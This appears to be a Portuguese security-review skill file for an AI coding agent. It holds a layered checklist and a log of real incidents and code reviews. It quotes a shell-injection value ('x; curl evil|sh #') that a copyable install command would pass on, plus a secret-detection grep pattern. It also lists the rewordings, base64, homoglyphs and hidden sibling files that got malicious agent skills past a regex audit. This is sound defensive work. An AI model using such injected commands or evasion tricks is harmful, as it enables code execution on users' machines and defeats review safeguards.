---
name: app-security
description: Revisão de segurança OBRIGATÓRIA dos apps do Samuel. Use SEMPRE ao escrever ou revisar QUALQUER código que toque dados, auth ou rede — PR review, criação/migration de tabela SQL, RLS, edge functions/hooks, frontend, backend, JWT, env vars, CI/workflows, infra/deploy. Checklist por camada destilado de incidentes REAIS (PAT org-wide vazado no bundle via VITE_, RLS off em dados financeiros/PII, Postgres exposto na internet). AUTO-EVOLUI: toda vulnerabilidade nova vira entrada no Registro + nova regra de checklist. Complementa [[dfl-pr-learnings]], [[dfl-schema-migrations]], [[dfl-permissions]], [[dfl-db-simplicity]].
tags: [security, rls, auth, checklist]
---

# App Security — checklist de segurança por camada

> Esta skill nasceu de um incidente REAL (2026-06-30): um GitHub PAT org-wide vazou no bundle público do portfólio via `VITE_GITHUB_TOKEN`, e o Supabase pessoal tinha tabelas financeiras (`sales`, clientes com CPF) **sem RLS, world-readable/writable** pela anon key. Objetivo desta skill: **nunca mais**. Veja o Registro no fim.

## Como usar
Rode esta camada **SEMPRE** que escrever ou revisar código. Antes de finalizar/abrir PR, passe pelo checklist da(s) camada(s) tocada(s). Achou vuln nova -> Auto-melhoria (append no Registro + nova regra).

## §0 — REGRAS BLOQUEANTES (nunca viole)
1. **NUNCA expor segredo no cliente.** Qualquer `VITE_*` / `NEXT_PUBLIC_*` / `import.meta.env.*` vira **público no bundle** (o bundler inlina em build-time). Token / service-role key / private key / webhook secret -> **SÓ server-side** (`process.env` em serverless/edge, `Deno.env.get`). Só `anon key` e `publishable key` podem ir pro cliente — e dependem de RLS pra serem seguros.
2. **Toda tabela em schema exposto à API tem RLS habilitado + policy correta.** RLS off em schema exposto = qualquer um com a anon key **lê/edita/apaga**. Default-deny.
3. **Least privilege em toda credencial.** Fine-grained, read-only quando der, escopo mínimo, expiração curta. NUNCA PAT classic `repo` org-wide pra um app pessoal.
4. **Vazou? ROTACIONE.** Corrigir o código NÃO mata a credencial exposta. Revogar/rotacionar mata todas as cópias (Wayback, scanners, deploys antigos) de uma vez.
5. **Nada server-side em `0.0.0.0` sem firewall no host.** DB/Studio/mail/dev em `127.0.0.1`. Nunca confiar SÓ no firewall de cloud (ponto único de falha off-host).

## §1 — Secrets / Env
- [ ] Nenhum secret atrás de prefixo client-exposed. Grepar o build (`dist/`) por `ghp_|github_pat_|service_role|sk-|AKIA|BEGIN PRIVATE KEY`.
- [ ] Service-role key só em serverless/edge (`process.env`), nunca em `src/`.
- [ ] `.env` real nunca no git (só `.env.example` com placeholder).
- [ ] Token novo = fine-grained, escopo mínimo, expiração curta.
- [ ] Pós-vazamento: rotacionar -> deletar deploys antigos (Vercel guarda bundle imutável por URL) -> checar Wayback + secret-scanning alerts.

## §2 — SQL / Migration / RLS
- [ ] `enable row level security` em TODA tabela nova de schema exposto.
- [ ] Policy por intenção:
  - **Dado do usuário** -> `using (auth.uid() = user_id)` em select/update/delete + `with check (auth.uid() = user_id)` no insert.
  - **Display público (read-only)** -> `for select to anon, authenticated using (true)`, SEM insert/update/delete.
  - **Server-side / sensível (PII, financeiro)** -> RLS on, SEM policy anon (service-role bypassa e o backend acessa).
- [ ] Nunca `using (true)` em dado NÃO-público (`rls_policy_always_true` = vaza tudo).
- [ ] Policy existe mas RLS off (`policy_exists_rls_disabled`) = não vale nada -> habilitar RLS.
- [ ] `SECURITY DEFINER` só com `set search_path = ''` + nomes 100% qualificados + `revoke execute from anon, authenticated` se não-RPC.
- [ ] NUNCA GRANT write SECURITY DEFINER a anon com schema exposto (gate do app é bypassável — ver [[dfl-schema-migrations]]).
- [ ] Rodar **Supabase Security Advisor** depois de migration (`/v1/projects/{ref}/advisors/security`).

## §3 — AuthN / JWT
- [ ] JWT: algoritmos FIXOS (ES256/RS256), checar `iss`/`aud`/`exp`/`sub`, default-deny. Nunca `alg:none` nem confusão HS/RS.
- [ ] Não usar IP / `X-Forwarded-For` como **autenticação** (spoofável fora da plataforma). IP da plataforma só pra rate-limit, nunca authz de endpoint que devolve dado.
- [ ] 2FA obrigatório em org/conta.

## §4 — Backend / API / Edge fn / Hooks
- [ ] Endpoint com service-role: **valida input** (Zod/bounds), **autoriza**, **rate-limit**. Service-role bypassa RLS -> o gate é o teu código.
- [ ] SSRF: validar/encodar input antes de interpolar em URL de fetch; `redirect:'manual'` + revalidar host contra allowlist; bloquear ranges privados (127/8, 169.254/16, 10/8...).
- [ ] Command injection: argv-array + `shell:false`; nunca string de shell com input.
- [ ] Webhook: validar assinatura (HMAC/RSA) DENTRO da função.
- [ ] Não ecoar erro/stack upstream pro cliente (info disclosure) — erro genérico, log server-side.
- [ ] **Campo de SEGURANÇA no payload (visibility / tenant_id / role / owner / org) = DERIVAR do principal autenticado, NUNCA confiar no input.** Endpoint privilegiado que carimba um campo que decide *quem-vê-o-quê* a partir do body → derivar do `source`/JWT autenticado (allowlist server-side) e TIRAR o campo do schema de entrada. Confiar no input = quem tem o segredo escreve qualquer tier. (PR #65 dfl-skills: confiava no `visibility` do payload → bearer-holder marcava skill `internal` como `public`.)
- [ ] **Um segredo por DOMÍNIO DE CONFIANÇA.** Não compartilhar um bearer/secret entre superfícies de confiança distintas (ex: CI do repo PÚBLICO + CI do repo PRIVADO no mesmo `INGEST_SECRET`) — leak de um lado dá write no outro. Segredo separado por origem + map server-side origem→permissão. (§0.3 least-privilege aplicado a segredo de serviço; blast-radius mínimo.)
- [ ] **Test-seam que repointa cliente privilegiado = guard de ambiente.** Função exportada (`_setX`, injeção de cliente service_role/admin) que troca a credencial privilegiada em runtime → `if (process.env.NODE_ENV === 'production') throw` (ou strip no build). Senão um import futuro/acidental/malicioso repointa o service_role em prod.


- [ ] **Persistir credencial (Bearer/token) atrelada a uma URL/host de fonte NÃO-confiável = validar scheme+host ANTES de gravar.** Config com token pra uma `url` que veio de resposta de API / env override / registry → validar `https://` + host allowlist (ex.: `*.devfellowship.com`) antes; senão um registry spoofado exfiltra o token pro endpoint do atacante no 1º round-trip. (skills-cli install-mcp.)
- [ ] **Componente que MONTA comando pra OUTRO executar (MCP tool / CLI / agente) = confused deputy → validar+allowlist os args ANTES.** Retornar `npx x add ${id}` como string pro host rodar → injeção se ele faz shell-exec. Retornar **argv array** (não string de shell), validar cada segmento (`^[a-z0-9._-]+$`, rejeitar `-` inicial=flag injection), documentar "exec via execFile, não shell". (skills-mcp install_skill.)
## §5 — Frontend / Web
- [ ] Security headers (vercel.json / next config): **CSP forte**, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`, `HSTS`, `Cross-Origin-Opener-Policy`.
- [ ] CSP funcional (não quebra o site): enumerar hosts reais (Supabase, analytics, imagens, fontes). Sem `unsafe-eval`. Verificar ao vivo após deploy.
- [ ] CORS sem wildcard-com-credentials.
- [ ] **Renderizar conteúdo de TERCEIRO (marketplace / README / campos de usuário) = SANITIZAR sempre.** NUNCA `dangerouslySetInnerHTML`/`innerHTML` com markdown/HTML de terceiro sem sanitize. Usar `react-markdown` SEM `rehype-raw`, ou `DOMPurify` + **allowlist de scheme no `href`** (só `http/https/mailto`; rejeitar `javascript:`/`data:`) + escapar `"`. Boundary única (`sanitizeX()`) na borda de entrada, não em cada render.
- [ ] **Comando copiável montado com input não-confiável = COPY-PASTE RCE.** String tipo `npx x add ${source}` que o user cola no terminal → validar/allowlist `source`/`slug`/args (`^[a-z0-9._/-]+$`) ANTES de exibir; senão `x; curl evil|sh #` vira execução na máquina de quem copiou.
- [ ] **Validação de URL/scheme: dois parsers que DISCORDAM = o regex caseiro é o elo fraco.** Se uma função valida scheme com regex E também usa `new URL()`, eles divergem: `java\tscript:` — o regex `^[a-z][a-z0-9+.-]*:` diz "sem scheme" (tab não está na classe) e cai no fallback permissivo, mas o WHATWG `URL` **remove** tab/newline e resolve `javascript:`. Fix: **rejeitar C0 controls (`\t\n\r` e `<0x20`) ANTES** do sniff, e checar `url.protocol` contra allowlist **incondicionalmente**. Vale pra util exportado reusado fora do contexto que "por sorte" já filtrava. (forge safeHref, W7 verify.)
- [ ] **`<img src>` (e qualquer atributo de URL) precisa da MESMA allowlist do `href`.** Não confie no default interno da lib (react-markdown `defaultUrlTransform`) — some se a versão mudar ou se ligarem `rehype-raw`. Override explícito do `img` rodando `src` no mesmo `safeHref`. (forge W7 verify.)
- [ ] Sem `dangerouslySetInnerHTML`/`innerHTML` com conteúdo não-sanitizado.
- [ ] Nenhum segredo no código do cliente (ver §1).

## §6 — Infra / Rede / Deploy
- [ ] Serviços (DB, Studio, mail, dev servers) em `127.0.0.1`, não `0.0.0.0`.
- [ ] Firewall no host como defesa-em-profundidade: `DOCKER-USER` p/ ports publicadas via Docker, `INPUT` p/ procs do host. **NUNCA tocar porta 22.** Auto-rollback se quebrar localhost.
- [ ] Trocar credenciais default (ex: `postgres:postgres`).
- [ ] Deploys antigos servindo segredo vazado -> deletar (URLs imutáveis).

## §7 — CI / Supply-chain
- [ ] `pull_request_target` + `secrets: inherit` NUNCA com checkout do código da PR (exfil de secret / repo takeover).
- [ ] Sem injeção via github.event em bloco `run:` — passar por `env:` e referenciar a variável com aspas.
- [ ] Lockfile commitado + `--frozen-lockfile` na CI.
- [ ] Actions pinadas em SHA nos workflows com secret / self-hosted runner.
- [ ] `npm audit` — corrigir HIGH/CRITICAL que chegam no bundle de produção.

- [ ] **Gate de CI (audit/scan/lint) só vale se for REQUIRED status check no branch protection.** CI vermelho é COSMÉTICO se o check não é required pra merge (+ sem bypass-actor amplo). Conferir o ruleset: o job de gate está em `required_status_checks`? tem bypass team? Sem isso, o gate é teatro.
- [ ] **Scanner de conteúdo por regex/keyword é BURLÁVEL — scan TODO o diff/pasta (não só o arquivo principal) + prefira review semântico (LLM).** Payload esconde em arquivo-irmão carregado em runtime (`read @helper.md`), reformula a frase, ou base64. Scan `**` da pasta; broaden patterns; um passo LLM que julga "instrui buscar/executar remoto, exfiltrar segredo, ofuscado?".
- [ ] **Validou N segmentos → tem que SHIPPAR os mesmos N.** Anti-padrão "valida-e-descarta": código valida `owner/repo/skill` (3 seg) e depois emite `owner/repo` (2 seg) no comando/URL — a identidade validada não é a executada, e num repo multi-skill instala a coisa errada. O valor exibido/executado/persistido tem que ser EXATAMENTE o validado, consistente entre repos que se espelham (front + MCP + CLI + README). (forge/skills-mcp W8.)
- [ ] **Scanner que anda em árvore de arquivos = hardening de walker (senão vira DoS/traversal no runner CI).** `lstatSync` (não `statSync`) + pular symlink; cap de tamanho por arquivo; cap de profundidade + de contagem de arquivos. E **escanear o NOME do arquivo também** (bidi/RTLO `U+202E` disfarça `evil‮gpj.exe`→`evilexe.jpg`; regex de conteúdo nunca vê o path). (skills#2 walker, W-audit verify.)
- [ ] **Comparação de nome reservado/identidade = NFKC + trim + considerar substring.** `"admin ".toLowerCase()` ≠ `"admin"` (sem trim passa); `"аdmin"` cirílico ≠ latino (sem NFKC passa); Set exato deixa `claude-helper`/`admin-utils` passar. Normalizar (NFKC), `trim()`, e checar prefixo/substring de impersonação. (skills#2 reserved-word.)
- [ ] **Gate advisory É teatro sem os 3 pilares de governança (verificar LIVE via API, não presumir):** (1) job em `required_status_checks` do ruleset ativo; (2) `require_code_owner_review: true` (CODEOWNERS sem isso NÃO bloqueia); (3) label de skip + `bypass_actors` restritos a poucos. Faltou 1 → qualquer colaborador mergeia/desliga o gate. (ruleset 12879690 devfellowship/skills: 0 required checks + code-owner-review false, W-audit verify.)
## §8 — PR Review (rodar SEMPRE junto da review normal)
Pra cada arquivo da PR, perguntar: **toca secret? toca tabela/RLS? toca auth/JWT? toca endpoint service-role? toca header/CSP? toca env do cliente? expõe porta?** Se sim -> aplicar a camada correspondente acima. Segurança é dimensão obrigatória de toda review, não opcional.

## Auto-melhoria (OBRIGATÓRIO — é isso que mantém a skill viva)
Toda vez que eu (ou um Advisor / scanner / pesquisador) achar uma vulnerabilidade nova num app do Samuel:
1. **Corrigir.**
2. **Append no Registro abaixo** (data, o que era, causa-raiz, fix) **+ adicionar a regra derivada** na camada correspondente.
A skill fica mais forte a cada incidente. Anunciar no chat ao atualizar.

## Registro de incidentes / vulnerabilidades
### 2026-06-30 — GitHub PAT vazado + Supabase pessoal sem RLS
- **PAT org-wide no bundle público** via `VITE_GITHUB_TOKEN` (Vite inlina `VITE_*`). Exposto set-nov/2025, nunca rotacionado -> pesquisador achou scaneando o JS ao vivo. => §0.1, §1.
- **Token over-scoped**: classic PAT `repo` org-wide (63 repos) usado num portfólio. => §0.3.
- **Supabase compartilhado (vários apps) com RLS off** em `app_financeiro.{sales,fixed_bills,sales_installments,sellers_clients}` (vendas + CPF/telefone de clientes) e `portfolio.{project_collaborators,project_links,project_images,project_sections}` — world read/write/delete pela anon key. Fix: RLS + policy `auth.uid()=user_id` (financeiro) / leitura pública (portfolio). => §0.2, §2.
- **Postgres em `0.0.0.0:54322` com senha default `postgres:postgres`**, só o cloud FW da Hetzner segurando. => §0.5, §6.
- **Outros**: security headers ausentes (§5), `/api/loc` write sem auth/rate-limit (§4), XFF como auth gate (§3), WS do Cockpit emitindo `role:admin` sem token (§3/§4), `pull_request_target`+`secrets:inherit` (§7).
- **Forense**: audit log do plano GitHub **Team NÃO loga `git.clone`/`fetch`** -> "sem rastro no log != não acessou". Sempre rotacionar e checar persistência no estado atual (deploy keys, webhooks, membros). Habilitar 2FA na org.
- Detalhes completos: memória `security_incident_2026_06_30`.

### 2026-06-29 — Review PR #65 (dfl-skills /ingest: SECURITY DEFINER RPC → TS + service_role)
Squad multi-agente (app-security + db-simplicity + pr-learnings + red-team) sobre o refactor do write-path. Vulns de segurança (=> viraram regras §4):
- **Confiava no `visibility` do payload** (`ingest.ts:169`): quem tem `SKILLS_INGEST_SECRET` marca skill `internal` como `public` (ou vice) → **colapsa a fronteira público/interno** que o split inteiro existe pra proteger. Fix: derivar do `source` autenticado. => §4 (campo-de-segurança-deriva-do-principal).
- **`SKILLS_INGEST_SECRET` único** compartilhado entre o CI do repo público e o do privado → leak = write em qualquer visibility, dos dois domínios. => §4/§0.3 (segredo por domínio de confiança).
- **Test-seams exportados** (`_setIngestSupabase`/`_setCapabilities`) sem guard → repointam o cliente service_role / forçam `ingestReady` em runtime. => §4 (guard NODE_ENV).
- **Erros ecoando** zod/DB pro caller, INCL. o read PÚBLICO (`skills.ts:101/145/165`) → reincidência da regra §4 "não ecoar erro/stack" (= a regra existe e voltou; reforço).
- **JWT sem checar `iss`/`aud`** (`scope.ts`) → reincidência §3.
- ✅ Bom (manter de molde): **two-client split** (service_role SÓ no write; read anon+RLS — service_role nunca toca read = não vaza internal), bearer `timingSafeEqual` constant-time + fail-closed, JWT travado em HS256, service_role só em `process.env` (server-only), zod em tudo. — Bug NÃO-segurança (upsert null-fill apaga embedding) foi pro [[dfl-pr-learnings]]/gotcha, não aqui.

### 2026-06-30 — Review front Forge (skills marketplace, SPA público)
Squad (app-security + code + red-team) no front que renderiza conteúdo de repos de TERCEIROS. Vulns:
- **XSS via markdown não-sanitizado** (`markdown.ts` caseiro → `dangerouslySetInnerHTML` em `MarkdownView`): campos de skill (name/description/README) de qualquer repo → JS arbitrário em quem abre a skill. `esc()` nem escapava `"`; link `href` sem allowlist de scheme (`javascript:` passava). => §5 (sanitizar conteúdo de terceiro).
- **Install-command copy-paste RCE** (`format.ts installCommand`): `source`/`slug` do payload num `npx skills add ...` copiável → `x; curl evil|sh #`. => §5 (comando copiável = validar input antes).
- CSP ausente (github.io não seta header; anotado p/ host header-capable). Reincidência §5.
- ✅ Limpo: sem segredo no bundle; interpolação React (texto puro) auto-escapa.
- **Molde:** app que renderiza conteúdo de terceiro (marketplace/UGC) trata TUDO como hostil — sanitize no adaptador de entrada, valida antes de qualquer comando copiável.

### 2026-06-30 — Review skills-cli + skills-mcp (overnight W2)
- **skills-mcp `install_skill` = command injection** (`src/tools/install.ts`): retorna `npx skills add <id>` sem validar `id`/`agents[]` → metachars → host agent que faz shell-exec = RCE (confused deputy). => §4 (componente monta comando pra outro).
- **skills-cli `install-mcp` = exfil de JWT** (`installMcp.ts`): grava o token dfl-iam pra QUALQUER `mcp.url` do registry, sem validar https/host; `SEARCH_API_BASE` idem. => §4 (credencial atrelada a URL não-confiável).
- ✅ Molde bom: CLI sem injection (argv arrays), JWT nunca logado, install-connection só ref (nunca valor), write atômico 0600, `assertValidServerName`, nunca `enableAllProjectMcpServers`. MCP: error-boundary por-tool, sem SSRF, shapes ok, tsc strict limpo.

### 2026-06-30 — Review registry devfellowship/skills (overnight W4)
- **Audit gate é ADVISORY, não enforced** (H1): branch protection SEM required_status_check pro job `audit` + bypass team → PR com audit falhando mergeia com 1 approval. => §7 (gate só vale se required). [SETTINGS — flag humano]
- **Audit regex burlável** (H2): 8/12 payloads passaram (reword, base64, "fetch+follow", process.env+fetch). => §7 (scan diff + LLM-review).
- **Só `SKILL.md` é escaneado** (H3): arquivo-irmão que o skill carrega em runtime não passa pelo gate → payload esconde lá. => §7 (scan pasta toda).
- H4 (server confia no visibility/source do payload) já mitigado pela dfl-services#65 (deriva do source). M4: web-design-guidelines faz fetch+exec de URL externa não-pinada. M5: parser de frontmatter dropa YAML aninhado (perde author).
- ✅ Os 3 skills seedados parseiam limpos, sem injection/secret.

### 2026-07-01 — Verify adversarial overnight (forge install-form + safeHref + audit walker/governança)
Três passes de verificação adversária dos fixes overnight acharam bugs REAIS que a review inicial não pegou:
- **"Valida 3 segmentos, shippa 2"** (forge `format.ts` installCommand + skills-mcp `install.ts`): computam `owner/repo/skill`, validam, e emitem `owner/repo` no comando de install → num repo multi-skill instala o REPO inteiro, não a skill. Contradiz o próprio `readme.ts`. => §7 (validou N, shippa N).
- **safeHref two-parser disagreement** (forge `markdown.ts`): regex de scheme discorda do WHATWG `URL` em `java\tscript:` — inalcançável hoje (CommonMark rejeita tab em link-dest) mas frágil num util exportado. + `<img src>` sem allowlist no app (seguro só pelo default do react-markdown). => §5 (dois parsers + img).
- **Audit gate skills#2 = advisory, NÃO boundary** (12 bypasses de content-scan: reword/PT/zero-width/base64<200/hex/homoglyph/RTLO-filename; walker sem lstat/size/depth cap = DoS; reserved-word sem NFKC/trim). Governança verificada LIVE: ruleset 12879690 SEM required_status_checks + `require_code_owner_review:false` → CODEOWNERS presente mas inerte; 10 colaboradores mergeiam/skip-label. => §7 (walker + NFKC + 3 pilares de governança). ✅ Sólido: `ingest` job (único com secret) gated a `push` = zero vazamento em PR.
- **Meta-lição de processo:** verify adversário INLINE ou por agente confiável — os agentes sonnet em background com prompt "adversarially verify" às vezes retornam lixo ("vou esperar o bg agent"). Verificação crítica não delega cega.

- **2026-07-06 · dfl-schema#627 (dfl-vaults)** — RPCs SECURITY DEFINER em `key_management` anon-granted + schema exposto: `get_encryption_key()` vazava a master key pra anon (+fallback hardcoded); `get/create/update_encrypted_item` furavam a RLS. Fix: REVOKE helpers, authz-gate nos item-RPCs espelhando a RLS, key fail-closed. → §0.2/§0.4
